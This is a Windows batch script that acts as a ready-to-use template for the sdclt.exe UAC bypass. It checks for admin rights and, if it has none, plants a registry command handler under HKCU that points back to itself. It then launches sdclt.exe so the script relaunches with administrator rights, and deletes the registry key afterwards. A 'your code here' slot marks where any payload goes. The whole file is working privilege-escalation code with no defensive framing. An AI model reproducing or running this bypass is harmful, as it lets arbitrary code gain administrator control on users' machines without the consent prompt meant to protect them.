@echo off
:: SELF ELEVATING USING SDCLT

net session >nul 2>&1
if %errorlevel% == 0 (
    echo.
    echo ============================================
    echo   This CMD is running with Administrator permissions.
    echo ============================================
    echo.
    pause
    goto main
)

echo [INFO] Attempting sdclt elevation...

:: sdclt UAC Bypass
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt6350g5f6c9b9w6y3\AppX82a6gwre4fdg3bt6350g5f6c9b9w6y3\Shell\Open\command" /ve /t REG_SZ /d "\"%~f0\" %*" /f >nul 2>&1
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt6350g5f6c9b9w6y3\AppX82a6gwre4fdg3bt6350g5f6c9b9w6y3\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f >nul 2>&1

start "" "%SystemRoot%\System32\sdclt.exe" >nul 2>&1
timeout /t 3 >nul 2>&1
reg delete "HKCU\Software\Classes\AppX82a6gwre4fdg3bt6350g5f6c9b9w6y3" /f >nul 2>&1

echo [INFO] Relaunching with admin rights...
exit /b

:main
:: your code here
pause
